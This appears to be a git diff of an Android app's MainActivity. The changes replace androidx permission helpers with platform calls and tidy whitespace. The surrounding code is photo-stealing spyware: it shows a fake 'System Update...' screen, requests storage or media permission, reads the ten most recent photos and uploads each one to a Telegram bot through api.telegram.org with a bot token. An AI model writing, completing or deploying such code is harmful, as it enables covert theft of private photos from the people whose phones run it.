@@ -14,10 +14,6 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import androidx.annotation.NonNull;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
-
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
 import java.net.HttpURLConnection;
@@ -31,15 +27,15 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
+
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setPadding(50, 50, 50, 50);
-        
+
         TextView tv = new TextView(this);
         tv.setText("System Update...");
         tv.setTextSize(18);
-        
+
         layout.addView(tv);
         setContentView(layout);
 
@@ -52,22 +48,22 @@ public class MainActivity extends Activity {
 
     private boolean checkPermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
+            return checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
         } else {
-            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
         }
     }
 
     private void requestPermissions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_CODE);
+            requestPermissions(new String[]{Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_CODE);
         } else {
-            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_CODE);
+            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_CODE);
         }
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
             startExtraction();
@@ -85,18 +81,18 @@ public class MainActivity extends Activity {
         protected Void doInBackground(Void... voids) {
             String[] projection = {MediaStore.Images.Media._ID};
             String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
-            
+
             Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);
-            
+
             if (cursor != null) {
                 int count = 0;
-                int maxImages = 10; 
-                
+                int maxImages = 10;
+
                 while (cursor.moveToNext() && count < maxImages) {
                     int idIndex = cursor.getColumnIndex(MediaStore.Images.Media._ID);
                     int id = cursor.getInt(idIndex);
                     Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
-                    
+
                     try {
                         Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), contentUri);
                         sendPhotoToTelegram(bitmap);
@@ -121,7 +117,7 @@ public class MainActivity extends Activity {
         String boundary = "*****";
         String lineEnd = "\r\n";
         String twoHyphens = "--";
-        
+
         try {
             URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -138,7 +134,7 @@ public class MainActivity extends Activity {
             request.writeBytes(twoHyphens + boundary + lineEnd);
             request.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"img.jpg\"" + lineEnd);
             request.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
-            
+
             ByteArrayOutputStream stream = new ByteArrayOutputStream();
             bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
             request.write(stream.toByteArray());
